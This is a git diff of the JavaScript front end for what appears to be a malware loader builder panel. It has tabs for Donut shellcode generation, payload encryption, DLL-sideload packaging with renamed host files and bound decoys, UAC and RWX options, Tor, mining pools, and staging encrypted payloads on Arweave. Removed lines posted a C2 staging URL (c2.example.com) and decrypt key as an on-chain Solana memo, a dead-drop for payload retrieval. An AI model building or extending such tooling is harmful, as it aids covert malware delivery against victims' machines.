@@ -5,6 +5,28 @@ const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
 
 // ─── utilities ────────────────────────────────────────────────────────────
 
+function getFilenameInputValue(id) {
+  const inp = $("#" + id);
+  if (!inp) return "";
+  const ext = inp.nextElementSibling?.classList.contains("file-ext")
+    ? inp.nextElementSibling.textContent : "";
+  const name = inp.value.trim();
+  return name ? name + ext : "";
+}
+
+function setFilenameInputValue(id, fullName) {
+  const inp = $("#" + id);
+  if (!inp) return;
+  const extEl = inp.nextElementSibling?.classList.contains("file-ext")
+    ? inp.nextElementSibling : null;
+  const ext = extEl ? extEl.textContent : "";
+  if (ext && fullName.endsWith(ext)) {
+    inp.value = fullName.slice(0, -ext.length);
+  } else {
+    inp.value = fullName;
+  }
+}
+
 function fmtSize(n) {
   if (!n) return "0 B";
   if (n < 1024) return `${n} B`;
@@ -33,17 +55,32 @@ function writeConsole(el, line, { ok = null, reset = false } = {}) {
 
 // ─── page switching ────────────────────────────────────────────────────────
 
+const VALID_PAGES = new Set(["build","sideload","donut","arweave","pools","tor"]);
+
+function navigateTo(target, pushState = true) {
+  if (!VALID_PAGES.has(target)) target = "build";
+  $$(".page-btn").forEach(b => b.classList.toggle("active", b.dataset.page === target));
+  $$(".page").forEach(p => p.classList.toggle("active", p.id === `page-${target}`));
+  if (pushState) history.pushState({ page: target }, "", `#${target}`);
+  if (target === "donut")    refreshDonutJobs();
+  if (target === "arweave")  { refreshWallets(); refreshEncryptDropdowns(); }
+  if (target === "sideload") refreshSideloadAssets();
+  if (target === "pools")    refreshPools();
+  if (target === "tor")      { torRefresh(); torLoadLog(); }
+  if (target === "build")    { refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); refreshPayloadSelector(); }
+}
+
 $$(".page-btn").forEach(btn => {
-  btn.addEventListener("click", () => {
-    $$(".page-btn").forEach(b => b.classList.toggle("active", b === btn));
-    const target = btn.dataset.page;
-    $$(".page").forEach(p => p.classList.toggle("active", p.id === `page-${target}`));
-    if (target === "donut")    refreshDonutJobs();
-    if (target === "solana")   refreshWallets();
-    if (target === "sideload") refreshSideloadAssets();
-    if (target === "build")  { refreshStatus(); refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); refreshPayloadSelector(); }
-  });
+  btn.addEventListener("click", () => navigateTo(btn.dataset.page));
 });
+
+// restore tab from hash on load / handle browser back-forward
+window.addEventListener("popstate", e => {
+  const page = (e.state && e.state.page) || location.hash.replace("#", "") || "build";
+  navigateTo(page, false);
+});
+
+// initial load: read hash — called at boot after all declarations (see bottom of file)
 
 // ─── inner tab switching (Build page) ─────────────────────────────────────
 
@@ -57,21 +94,6 @@ $$(".tab").forEach(btn => {
   });
 });
 
-// ─── status pills ─────────────────────────────────────────────────────────
-
-async function refreshStatus() {
-  try {
-    const j = await fetch("/api/status").then(r => r.json());
-    const pp = $("#pill-payload");
-    pp.textContent = j.payload_h ? "Payload.h ✓" : "Payload.h —";
-    pp.classList.toggle("ok",  !!j.payload_h);
-    pp.classList.toggle("bad", !j.payload_h);
-    const ps = $("#pill-sideload");
-    ps.textContent = j.sideload_h ? "Sideload.h ✓" : "Sideload.h —";
-    ps.classList.toggle("ok",  !!j.sideload_h);
-    ps.classList.toggle("bad", !j.sideload_h);
-  } catch (_) {}
-}
 
 // ─── artifacts ────────────────────────────────────────────────────────────
 
@@ -133,14 +155,13 @@ function cddSetValue(wrapId, hiddenId, value) {
     _cddSetDisplay(wrap, item.innerHTML.replace(/<button[^>]*>.*?<\/button>/s, "").trim());
     wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
   } else {
-    _cddSetDisplay(wrap, value ? `#${value.slice(0,6)}…` : "— select a Donut job —");
+    _cddSetDisplay(wrap, value ? `#${value.slice(0,6)}…` : "— select a Stub —");
     wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
   }
 }
 
 // ─── encrypt dropdowns ────────────────────────────────────────────────────
 // Populates:  #enc-sc-job-wrap / #enc-sc-job  (shellcode from donut workspace)
-//             #enc-wallet-sel + #pep-wallet-sel (wallets from solana workspace)
 
 async function refreshEncryptDropdowns() {
   // Donut jobs → custom shellcode dropdown
@@ -153,13 +174,12 @@ async function refreshEncryptDropdowns() {
     _cddValidIds.clear();
     const ok = jobs.filter(j => j.ok);
     if (!ok.length) {
-      _cddSetDisplay(wrap, "— no successful Donut jobs yet —");
+      _cddSetDisplay(wrap, "— no successful Stub jobs yet —");
       $("#enc-sc-job").value = "";
     } else {
-      // placeholder row
       const ph = document.createElement("div");
       ph.className = "cdd-item cdd-placeholder";
-      ph.textContent = "— select a Donut job —";
+      ph.textContent = "— select a Stub —";
       ph.addEventListener("click", () => { cddSetValue("enc-sc-job-wrap", "enc-sc-job", ""); _cddClose(); });
       list.appendChild(ph);
 
@@ -184,14 +204,13 @@ async function refreshEncryptDropdowns() {
         list.appendChild(item);
       }
       if (!prev || !_cddValidIds.has(prev)) {
-        _cddSetDisplay(wrap, "— select a Donut job —");
+        _cddSetDisplay(wrap, "— select a Stub —");
         $("#enc-sc-job").value = "";
       } else {
         cddSetValue("enc-sc-job-wrap", "enc-sc-job", prev);
       }
     }
 
-    // wire trigger open/close
     const trigger = wrap.querySelector(".cdd-trigger");
     trigger.onclick = (e) => {
       e.stopPropagation();
@@ -204,46 +223,53 @@ async function refreshEncryptDropdowns() {
     };
   } catch (_) {}
 
-  // Wallets → encrypt wallet selector
+  // Wallets → enc-wallet-wrap / enc-wallet-id
   try {
     const wallets = await fetch("/api/wallets").then(r => r.json());
-    const wrap    = $("#enc-wallet-sel-wrap");
-    const hidden  = $("#enc-wallet-sel");
-    const list    = wrap.querySelector(".cdd-list");
-    const prev    = hidden.value;
+    const wrap    = $("#enc-wallet-wrap");
+    const hidden  = $("#enc-wallet-id");
+    if (!wrap || !hidden) return;
+    const list = wrap.querySelector(".cdd-list");
+    const prev = hidden.value;
     list.innerHTML = "";
 
     const ph = document.createElement("div");
     ph.className = "cdd-item cdd-placeholder";
-    ph.textContent = "— select from Solana workspace —";
-    ph.addEventListener("click", () => { hidden.value = ""; $("#enc-wallet").value = "";
-      _cddSetDisplay(wrap, "— select from Solana workspace —");
+    ph.textContent = "— select a wallet —";
+    ph.addEventListener("click", () => {
+      hidden.value = "";
+      _cddSetDisplay(wrap, "— select a wallet —");
       wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
-      _cddClose(); });
+      _cddClose();
+    });
     list.appendChild(ph);
 
-    for (const w of wallets) {
-      const item = document.createElement("div");
-      item.className = "cdd-item";
-      item.dataset.value = w.id;
-      item.dataset.addr  = w.address;
-      item.innerHTML = `
-        <span class="cdd-label-badge">${w.name}</span>
-        <span class="cdd-item-name">${trunc(w.address, 22)}</span>`;
-      item.addEventListener("click", () => {
-        hidden.value = w.id;
-        $("#enc-wallet").value = w.address;
-        _cddSetDisplay(wrap, item.innerHTML);
-        wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
-        _cddClose();
-      });
-      if (w.id === prev) item.classList.add("cdd-selected");
-      list.appendChild(item);
-    }
-
-    if (!prev || !wallets.find(w => w.id === prev)) {
-      _cddSetDisplay(wrap, "— select from Solana workspace —");
-      hidden.value = "";
+    if (!wallets.length) {
+      _cddSetDisplay(wrap, "— no wallets yet (create one in the Arweave tab) —");
+    } else {
+      for (const w of wallets) {
+        const item = document.createElement("div");
+        item.className = "cdd-item" + (w.id === prev ? " cdd-selected" : "");
+        item.dataset.value = w.id;
+        item.innerHTML = `
+          <span class="cdd-item-id">#${w.id.slice(0,6)}</span>
+          <span class="cdd-label-badge">${w.name}</span>
+          <span class="cdd-item-name">${w.address}</span>`;
+        item.addEventListener("click", () => {
+          hidden.value = w.id;
+          _cddSetDisplay(wrap, item.innerHTML);
+          wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
+          _cddClose();
+        });
+        list.appendChild(item);
+      }
+      if (prev && wallets.find(w => w.id === prev)) {
+        const sel = wrap.querySelector(`.cdd-item[data-value="${CSS.escape(prev)}"]`);
+        if (sel) _cddSetDisplay(wrap, sel.innerHTML);
+      } else {
+        _cddSetDisplay(wrap, "— select a wallet —");
+        hidden.value = "";
+      }
     }
 
     const trigger = wrap.querySelector(".cdd-trigger");
@@ -256,15 +282,6 @@ async function refreshEncryptDropdowns() {
   } catch (_) {}
 }
 
-// Shellcode source toggle
-$$("input[name=sc_src]").forEach(r => r.addEventListener("change", syncScSource));
-function syncScSource() {
-  const mode = $("input[name=sc_src]:checked")?.value;
-  $("#enc-sc-job-wrap").style.display = mode === "workspace" ? "" : "none";
-  $("#enc-sc-file").style.display     = mode === "upload"    ? "" : "none";
-}
-syncScSource();
-
 // ─── encrypt ──────────────────────────────────────────────────────────────
 
 $("#form-encrypt").addEventListener("submit", async (e) => {
@@ -272,27 +289,13 @@ $("#form-encrypt").addEventListener("submit", async (e) => {
   const out = $("#out-encrypt");
   writeConsole(out, "> running Encrypt.py …\n", { reset: true });
 
-  const form = e.target;
-  const fd   = new FormData();
+  const fd = new FormData();
 
-  // Wallet: prefer wallet_id from custom dropdown, fall back to text
-  const walletId = $("#enc-wallet-sel")?.value || "";
-  if (walletId) {
-    fd.append("wallet_id", walletId);
-  } else {
-    const addr = form.sol_wallet?.value?.trim() || "";
-    if (addr) fd.append("sol_wallet", addr);
-  }
+  const jobId = $("#enc-sc-job").value;
+  if (jobId) fd.append("shellcode_job_id", jobId);
 
-  // Shellcode source
-  const scMode = $("input[name=sc_src]:checked")?.value;
-  if (scMode === "workspace") {
-    const jobId = $("#enc-sc-job").value;
-    if (jobId) fd.append("shellcode_job_id", jobId);
-  } else {
-    const file = $("#enc-sc-file").files[0];
-    if (file) fd.append("shellcode", file);
-  }
+  const walletId = $("#enc-wallet-id").value;
+  if (walletId) fd.append("wallet_id", walletId);
 
   try {
     const r = await fetch("/api/encrypt", { method: "POST", body: fd });
@@ -300,9 +303,7 @@ $("#form-encrypt").addEventListener("submit", async (e) => {
     if (j.stdout) writeConsole(out, j.stdout);
     if (j.stderr) writeConsole(out, j.stderr);
     writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
-    if (j.payload_preview) $("#preview-payload").textContent = j.payload_preview;
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
-  refreshStatus();
   refreshEncryptHistory();
   refreshPayloadSelector();
 });
@@ -485,6 +486,7 @@ function renderBinds() {
 function selectBind(id) {
   const sel = $("#sl-bind-sel");
   if (sel) sel.value = id;
+  syncBindRenameExt();
   renderBinds();
 }
 
@@ -541,6 +543,21 @@ function refreshSideloadSelectors() {
     if (prevBind && [...bindSel.options].some(o => o.value === prevBind)) bindSel.value = prevBind;
   }
 
+  syncBindRenameExt();
+}
+
+function syncBindRenameExt() {
+  const extEl = $("#sl-bind-rename-ext");
+  if (!extEl) return;
+  const bindSel = $("#sl-bind-sel");
+  const id = bindSel?.value;
+  const bind = id ? _binds.find(b => b.id === id) : null;
+  if (bind?.name) {
+    const dot = bind.name.lastIndexOf(".");
+    extEl.textContent = dot !== -1 ? bind.name.slice(dot) : "";
+  } else {
+    extEl.textContent = "";
+  }
 }
 
 
@@ -549,6 +566,7 @@ function refreshSideloadSelectors() {
 function syncBuildMode() {
   const mode = $("input[name=mode]:checked", $("#form-build"))?.value;
   $("#field-sideload-config")?.classList.toggle("hidden", mode !== "sideload");
+  $("#field-exe-name")?.classList.toggle("hidden", mode === "sideload");
 }
 $$("input[name=mode]").forEach(r => r.addEventListener("change", () => {
   syncBuildMode();
@@ -565,6 +583,8 @@ try {
 } catch (_) {}
 syncBuildMode();
 
+$("#sl-bind-sel")?.addEventListener("change", syncBindRenameExt);
+
 $("#form-build").addEventListener("submit", async (e) => {
   e.preventDefault();
   const out = $("#out-build"), form = e.target;
@@ -577,14 +597,15 @@ $("#form-build").addEventListener("submit", async (e) => {
     rwx:                form.rwx.checked,
     debug:              form.debug.checked,
     synthetic:          form.synthetic.checked,
+    exe_output_name:    $("#bld-exe-name")?.value.trim()   || "",
     encrypt_history_id: $("#bld-payload-sel")?.value       || "",
     dll_id:             $("#sl-dll-sel")?.value            || "",
     exe_id:             $("#sl-exe-sel")?.value            || "",
-    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
-    host_rename:        $("#sl-host-rename")?.value.trim() || "",
-    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
+    sideload_rename:    getFilenameInputValue("sl-dll-rename"),
+    host_rename:        getFilenameInputValue("sl-host-rename"),
+    zip_name:           getFilenameInputValue("sl-zip-name"),
     bind_id:            $("#sl-bind-sel")?.value           || "",
-    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
+    bind_rename:        getFilenameInputValue("sl-bind-rename"),
   };
 
   const btn = $("button.primary", form);
@@ -606,7 +627,7 @@ $("#form-build").addEventListener("submit", async (e) => {
     const m = last?.match(/\[exit (-?\d+)\]/);
     if (m) { out.classList.toggle("ok", m[1] === "0"); out.classList.toggle("bad", m[1] !== "0"); }
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
-  finally { btn.disabled = false; btn.textContent = "Build"; refreshStatus(); refreshBuildHistory(); }
+  finally { btn.disabled = false; btn.textContent = "Build"; refreshBuildHistory(); }
 });
 
 // ─── profiles ─────────────────────────────────────────────────────────────
@@ -619,13 +640,13 @@ let _curEncProfileId = null, _curEncProfileName = "";
 let _curBldProfileId = null, _curBldProfileName = "";
 
 async function refreshEncProfiles() {
-  try { _encProfiles = await fetch("/api/profiles/encrypt").then(r => r.json()); }
+  try { _encProfiles = await fetch("/api/profiles/encrypt").then(r => r.json()); _encProfiles.sort((a,b) => a.name.localeCompare(b.name)); }
   catch (_) { _encProfiles = []; }
   renderEncProfiles();
 }
 
 async function refreshBldProfiles() {
-  try { _bldProfiles = await fetch("/api/profiles/build").then(r => r.json()); }
+  try { _bldProfiles = await fetch("/api/profiles/build").then(r => r.json()); _bldProfiles.sort((a,b) => a.name.localeCompare(b.name)); }
   catch (_) { _bldProfiles = []; }
   renderBldProfiles();
 }
@@ -638,7 +659,7 @@ function _renderProfileList(profiles, listEl, emptyEl, loadFn, delFn) {
     const li = document.createElement("li");
     li.className = "mgmt-item";
     li.innerHTML = `
-      <div class="mi-info">
+      <div class="mi-info" style="cursor:pointer" data-show="${p.id}">
         <div class="mi-name">${p.name}</div>
         <div class="mi-meta" style="font-size:10px;color:var(--text-mute)">${_profileMeta(p)}</div>
       </div>
@@ -648,6 +669,54 @@ function _renderProfileList(profiles, listEl, emptyEl, loadFn, delFn) {
       </div>`;
     listEl.appendChild(li);
   }
+  listEl.querySelectorAll("[data-show]").forEach(el => el.addEventListener("click", async (e) => {
+    e.stopPropagation();
+    const id = el.dataset.show;
+    const p = profiles.find(x => x.id === id);
+    if (!p) return;
+    document.querySelectorAll(".profile-popup-overlay").forEach(x => x.remove());
+    // ensure lookup arrays are populated
+    if (!_encryptHistory.length) try { _encryptHistory = await fetch("/api/encrypt/history").then(r => r.json()); } catch(_) {}
+    if (!_donutJobs.length)     try { _donutJobs     = await fetch("/api/donut/jobs").then(r => r.json()); }       catch(_) {}
+    if (!_wallets.length)       try { _wallets        = await fetch("/api/wallets").then(r => r.json()); }          catch(_) {}
+    if (!_dlls.length)          try { _dlls           = await fetch("/api/dlls").then(r => r.json()); }             catch(_) {}
+    if (!_exes.length)          try { _exes           = await fetch("/api/exes").then(r => r.json()); }             catch(_) {}
+    if (!_binds.length)         try { _binds          = await fetch("/api/binds").then(r => r.json()); }            catch(_) {}
+    const rows = [];
+    if (p.type === "build" || p.mode) {
+      rows.push(["Mode", p.mode || "exe"]);
+      rows.push(["UAC", p.uac ? "yes" : "no"]);
+      rows.push(["RWX", p.rwx ? "yes" : "no"]);
+      rows.push(["Debug", p.debug ? "yes" : "no"]);
+      rows.push(["Synthetic stack", p.synthetic ? "yes" : "no"]);
+      if (p.exe_output_name) rows.push(["Output", p.exe_output_name]);
+      if (p.dll_id)  { const d = _dlls.find(x => x.id === p.dll_id);  rows.push(["DLL",       d ? d.name : p.dll_id]); }
+      if (p.exe_id)  { const x = _exes.find(x => x.id === p.exe_id);  rows.push(["Host EXE",  x ? x.name : p.exe_id]); }
+      if (p.zip_name)  rows.push(["ZIP name",  p.zip_name]);
+      if (p.bind_id) { const b = _binds.find(x => x.id === p.bind_id); rows.push(["Bind file", b ? b.name : p.bind_id]); }
+      if (p.encrypt_history_id) { const e = _encryptHistory.find(x => x.id === p.encrypt_history_id); rows.push(["Payload.h", e ? (e.donut_label || fmtTimeShort(e.created_at)) : p.encrypt_history_id.slice(0,8)]); }
+    } else {
+      if (p.shellcode_job_id) { const j = _donutJobs.find(x => x.id === p.shellcode_job_id); rows.push(["Shellcode", j ? (j.label || j.id.slice(0,8)) : p.shellcode_job_id.slice(0,8)]); }
+      if (p.wallet_id) { const w = _wallets.find(x => x.id === p.wallet_id); rows.push(["Wallet", w ? w.name : p.wallet_id.slice(0,12) + "…"]); }
+    }
+    const overlay = document.createElement("div");
+    overlay.className = "profile-popup-overlay";
+    const win = document.createElement("div");
+    win.className = "profile-popup";
+    win.innerHTML =
+      `<div class="profile-popup-header">
+        <span class="profile-popup-title">${p.name}</span>
+        <button class="profile-popup-close">✕</button>
+      </div>
+      <div class="profile-popup-body">` +
+      rows.map(([k,v]) => `<div class="profile-popup-row"><span class="profile-popup-k">${k}</span><span class="profile-popup-v">${v}</span></div>`).join("") +
+      `</div>`;
+    overlay.appendChild(win);
+    document.body.appendChild(overlay);
+    const close = () => overlay.remove();
+    overlay.addEventListener("click", e => { if (e.target === overlay) close(); });
+    win.querySelector(".profile-popup-close").addEventListener("click", close);
+  }));
   listEl.querySelectorAll("[data-load]").forEach(b => b.addEventListener("click", () => loadFn(b.dataset.load)));
   listEl.querySelectorAll("[data-del]").forEach(b => b.addEventListener("click", () => delFn(b.dataset.del)));
 }
@@ -657,7 +726,7 @@ function _profileMeta(p) {
     const flags = [p.mode||"exe", p.uac?"uac":"", p.rwx?"rwx":"", p.debug?"dbg":""].filter(Boolean).join(" · ");
     return flags + (p.encrypt_history_id ? ` · enc:#${p.encrypt_history_id.slice(0,6)}` : "");
   }
-  return (p.sol_wallet ? trunc(p.sol_wallet, 22) : "—");
+  return (p.shellcode_job_id ? `#${p.shellcode_job_id.slice(0,6)}` : "—");
 }
 
 function renderEncProfiles() {
@@ -674,11 +743,28 @@ function loadEncProfile(id) {
   if (!p) return;
   _curEncProfileId = id; _curEncProfileName = p.name;
   $("#btn-show-save-enc-profile").textContent = `↺ ${p.name}`;
-  $("#enc-wallet").value = p.sol_wallet || "";
   if (p.shellcode_job_id && _cddValidIds.has(p.shellcode_job_id)) {
     cddSetValue("enc-sc-job-wrap", "enc-sc-job", p.shellcode_job_id);
-    const r = $("input[name=sc_src][value=workspace]");
-    if (r) { r.checked = true; syncScSource(); }
+  }
+  // restore wallet CDD
+  const wWrap   = $("#enc-wallet-wrap");
+  const wHidden = $("#enc-wallet-id");
+  if (wWrap && wHidden) {
+    if (p.wallet_id) {
+      wHidden.value = p.wallet_id;
+      const item = wWrap.querySelector(`.cdd-item[data-value="${CSS.escape(p.wallet_id)}"]`);
+      if (item) {
+        _cddSetDisplay(wWrap, item.innerHTML);
+        wWrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
+      } else {
+        _cddSetDisplay(wWrap, "— select a wallet —");
+        wHidden.value = "";
+      }
+    } else {
+      wHidden.value = "";
+      _cddSetDisplay(wWrap, "— select a wallet —");
+      wWrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
+    }
   }
   $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
   $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));
@@ -700,12 +786,14 @@ function loadBldProfile(id) {
   if (dllSel && p.dll_id) { dllSel.value = p.dll_id; if (dllSel.value !== p.dll_id) dllSel.value = ""; }
   const exeSel = $("#sl-exe-sel");
   if (exeSel && p.exe_id) { exeSel.value = p.exe_id; if (exeSel.value !== p.exe_id) exeSel.value = ""; }
-  if ($("#sl-dll-rename"))  $("#sl-dll-rename").value  = p.sideload_rename || "";
-  if ($("#sl-host-rename")) $("#sl-host-rename").value = p.host_rename     || "";
-  if ($("#sl-zip-name"))    $("#sl-zip-name").value    = p.zip_name        || "";
+  setFilenameInputValue("sl-dll-rename",  p.sideload_rename || "");
+  setFilenameInputValue("sl-host-rename", p.host_rename     || "");
+  setFilenameInputValue("sl-zip-name",    p.zip_name        || "");
   const bindSel = $("#sl-bind-sel");
   if (bindSel && p.bind_id) { bindSel.value = p.bind_id; if (bindSel.value !== p.bind_id) bindSel.value = ""; }
-  if ($("#sl-bind-rename")) $("#sl-bind-rename").value = p.bind_rename || "";
+  syncBindRenameExt();
+  setFilenameInputValue("sl-bind-rename", p.bind_rename || "");
+  if ($("#bld-exe-name"))   $("#bld-exe-name").value   = p.exe_output_name || "";
   // Payload.h selector — set hidden value then let refreshPayloadSelector sync CDD display
   const payloadSel = $("#bld-payload-sel");
   if (payloadSel) payloadSel.value = p.encrypt_history_id || "";
@@ -731,20 +819,21 @@ async function deleteBldProfile(id) {
 
 function collectEncryptData() {
   return {
-    sol_wallet:       $("#enc-wallet")?.value || "",
     shellcode_job_id: $("#enc-sc-job")?.value || "",
+    wallet_id:        $("#enc-wallet-id")?.value || "",
   };
 }
 function collectBuildData() {
   return {
+    exe_output_name:    $("#bld-exe-name")?.value.trim()   || "",
     encrypt_history_id: $("#bld-payload-sel")?.value       || "",
     dll_id:             $("#sl-dll-sel")?.value            || "",
     exe_id:             $("#sl-exe-sel")?.value            || "",
-    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
-    host_rename:        $("#sl-host-rename")?.value.trim() || "",
-    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
+    sideload_rename:    getFilenameInputValue("sl-dll-rename"),
+    host_rename:        getFilenameInputValue("sl-host-rename"),
+    zip_name:           getFilenameInputValue("sl-zip-name"),
     bind_id:            $("#sl-bind-sel")?.value           || "",
-    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
+    bind_rename:        getFilenameInputValue("sl-bind-rename"),
     mode:               $("input[name=mode]:checked")?.value || "exe",
     uac:                $("#bld-uac")?.checked   || false,
     rwx:                $("#bld-rwx")?.checked   || false,
@@ -862,7 +951,6 @@ function renderEncryptHistory() {
     el.dataset.key = j.key || "";
 
     const dot        = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
-    const wallet     = j.wallet ? trunc(j.wallet, 22) : "—";
     const dateStr    = fmtTimeShort(j.created_at);
     const donutBadge = j.donut_label
       ? `<span class="ji-label-badge">${j.donut_label}</span>`
@@ -874,32 +962,36 @@ function renderEncryptHistory() {
       dls += ` <a class="btn-xs primary" href="/api/encrypt/history/${j.id}/download/dat">↓ data.enc</a>`;
 
     // action buttons
-    const copyBtnHtml    = j.key ? `<button class="btn-xs btn-hist-copy">Copy key</button>` : "";
-    const canPublish     = j.key && j.wallet_id;
-    const publishBtnHtml = canPublish ? `<button class="btn-xs btn-hist-pub">⚡ Publish</button>` : "";
+    const copyBtnHtml    = j.dat_size > 0 ? `<button class="btn-xs btn-hist-copy">Copy key</button>` : "";
+    const canPublish     = j.ok && j.dat_size > 0;
+    const publishBtnHtml = canPublish ? `<button class="btn-xs btn-hist-pub">⚡ Upload</button>` : "";
+
+    // wallet badge shown in meta row
+    const walletBadge = j.wallet_address
+      ? `<span class="cdd-item-meta" title="${j.wallet_address}">◆ ${trunc(j.wallet_address, 14)}</span>`
+      : "";
+    const txBadge = (j.arweave_tx_id || j.arweave_meta_tx_id)
+      ? `<span class="cdd-item-meta" style="color:var(--accent)">✓ on-chain</span>`
+      : "";
 
     el.innerHTML = `
       <div class="hist-head">
         ${dot}
-        <span class="hist-name">${wallet}</span>
+        <span class="hist-name">#${j.id.slice(0,6)}</span>
         <button class="btn-xs btn-danger hist-del" title="Delete run + files">✕</button>
       </div>
       <div class="hist-meta">
         <span class="ji-id">#${j.id}</span>
         ${donutBadge}
         <span>${j.dat_size ? fmtSize(j.dat_size) + " enc" : ""}</span>
+        ${walletBadge}
+        ${txBadge}
         <span>${dateStr}</span>
       </div>
       <div class="hist-dls">${dls} ${copyBtnHtml} ${publishBtnHtml}</div>
 
-      <!-- publish panel (hidden until ⚡ Publish clicked) -->
-      <div class="hist-pub-panel hidden">
-        <div class="hist-pub-row">
-          <input class="hist-pub-url" type="url" placeholder="Staging URL — https://c2.example.com/data.enc" style="flex:2">
-          <button class="btn-xs primary hist-pub-btn">Publish on-chain</button>
-        </div>
-        <pre class="hist-pub-out"></pre>
-      </div>`;
+      <!-- arweave upload output (hidden until ⚡ Upload clicked) -->
+      <pre class="hist-pub-out hidden"></pre>`;
 
     list.appendChild(el);
 
@@ -910,62 +1002,48 @@ function renderEncryptHistory() {
     });
 
     // ── wire copy key ──
-    el.querySelector(".btn-hist-copy")?.addEventListener("click", () => {
-      const key = el.dataset.key;
-      if (!key) return;
-      navigator.clipboard.writeText(key).then(() => {
-        const btn = el.querySelector(".btn-hist-copy");
-        const orig = btn.textContent;
+    el.querySelector(".btn-hist-copy")?.addEventListener("click", async () => {
+      const btn = el.querySelector(".btn-hist-copy");
+      const orig = btn.textContent;
+      try {
+        const r = await fetch(`/api/encrypt/history/${j.id}/download/key`);
+        const text = await r.text();
+        await navigator.clipboard.writeText(text.trim());
         btn.textContent = "Copied!";
         setTimeout(() => { btn.textContent = orig; }, 1800);
-      }).catch(() => {});
+      } catch { btn.textContent = "Failed"; setTimeout(() => { btn.textContent = orig; }, 1800); }
     });
 
-    // ── wire publish toggle ──
-    el.querySelector(".btn-hist-pub")?.addEventListener("click", () => {
-      el.querySelector(".hist-pub-panel").classList.toggle("hidden");
-    });
+    // ── wire upload: POST directly to /api/encrypt/history/<jid>/publish ──
+    el.querySelector(".btn-hist-pub")?.addEventListener("click", async () => {
+      const out = el.querySelector(".hist-pub-out");
+      out.classList.remove("hidden");
+      out.textContent = "> uploading to Arweave … (may take 30–60 s)\n";
+      out.className = "hist-pub-out";
 
-    // ── publish button: join staging URL + stored key → memo, then post ──
-    el.querySelector(".hist-pub-btn")?.addEventListener("click", async () => {
-      const panel      = el.querySelector(".hist-pub-panel");
-      const out        = panel.querySelector(".hist-pub-out");
-      const stagingUrl = panel.querySelector(".hist-pub-url").value.trim();
-      const key        = el.dataset.key;
-      const wid        = j.wallet_id;
-
-      if (!stagingUrl || !stagingUrl.startsWith("http")) {
-        out.textContent = "[-] Staging URL required (must start with http).";
-        out.className = "hist-pub-out bad"; return;
-      }
-      if (!key) { out.textContent = "[-] No decrypt key stored."; out.className = "hist-pub-out bad"; return; }
-      if (!wid) { out.textContent = "[-] Wallet not in workspace (manual address used)."; out.className = "hist-pub-out bad"; return; }
-
-      const memo = `${stagingUrl}|${key}`;
-
-      const btn = el.querySelector(".hist-pub-btn");
-      btn.disabled = true; btn.textContent = "Publishing…";
-      out.textContent = "> broadcasting …";
-      out.className   = "hist-pub-out";
+      const btn = el.querySelector(".btn-hist-pub");
+      btn.disabled = true; btn.textContent = "Uploading…";
 
       try {
-        const r = await fetch(`/api/wallets/${wid}/publish`, {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ memo }),
-        });
+        const r  = await fetch(`/api/encrypt/history/${j.id}/publish`, { method: "POST" });
         const jr = await r.json();
+        if (jr.stdout) out.textContent += jr.stdout;
+        if (jr.stderr) out.textContent += jr.stderr;
         if (jr.ok) {
-          out.textContent = `[+] Sent!  Sig: ${jr.signature}\nhttps://solscan.io/tx/${jr.signature}`;
-          out.className   = "hist-pub-out ok";
+          let msg = `[+] Upload complete!\n`;
+          if (jr.tx_id)    msg += `    TX ID  : ${jr.tx_id}\n`;
+          if (jr.data_url) msg += `    URL    : ${jr.data_url}\n`;
+          out.textContent += msg;
+          out.className = "hist-pub-out ok";
         } else {
-          out.textContent = `[-] ${jr.error || jr.stderr || "Failed"}`;
-          out.className   = "hist-pub-out bad";
+          out.textContent += `[-] ${jr.error || jr.stderr || "Failed"}`;
+          out.className = "hist-pub-out bad";
         }
       } catch (err) {
-        out.textContent = `[network error] ${err}`;
-        out.className   = "hist-pub-out bad";
+        out.textContent += `[network error] ${err}`;
+        out.className = "hist-pub-out bad";
       } finally {
-        btn.disabled = false; btn.textContent = "Publish on-chain";
+        btn.disabled = false; btn.textContent = "⚡ Upload";
       }
     });
   }
@@ -1019,7 +1097,7 @@ function renderBuildHistory() {
     el.innerHTML = `
       <div class="hist-head">
         ${dot}
-        <span class="hist-name">${j.binary_name || "—"}</span>
+        <span class="hist-name">${(j.mode === "sideload" && j.zip_name) ? j.zip_name : (j.binary_name || "—")}</span>
         <button class="btn-xs btn-danger hist-del" data-hid="${j.id}" title="Delete">✕</button>
       </div>
       <div class="hist-meta">
@@ -1089,6 +1167,7 @@ function renderDonutJobs() {
       <div class="ji-meta">
         <span class="ji-id">#${j.id}</span>
         <span>${j.arch_label}</span>
+        ${j.converted ? `<span class="ji-converted-badge">x86→x64</span>` : ""}
         ${j.size_in  ? `<span>${fmtSize(j.size_in)} in</span>` : ""}
         ${j.size_out ? `<span>→ ${fmtSize(j.size_out)}</span>` : ""}
       </div>
@@ -1139,7 +1218,7 @@ $("#form-donut").addEventListener("submit", async (e) => {
   const out    = $("#out-donut");
   const result = $("#donut-result");
   result.classList.add("hidden"); result.innerHTML = "";
